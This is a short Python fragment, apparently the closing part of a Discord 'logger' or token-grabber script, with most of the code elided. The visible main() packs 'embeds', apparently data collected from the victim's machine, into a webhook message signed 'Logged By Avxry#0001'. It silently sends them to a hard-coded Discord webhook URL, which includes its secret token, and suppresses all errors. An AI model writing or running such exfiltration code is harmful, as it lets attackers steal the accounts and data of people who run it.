...
def main():
    ...
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Logged By Avxry#0001",
        "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/923337914715353118/5e6aycFr7REE2vH5tiSgVJyEiR0uR20f7FCqbNt_4-G_td2Tyk4o5qxLTz0rnhdNa1DA", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
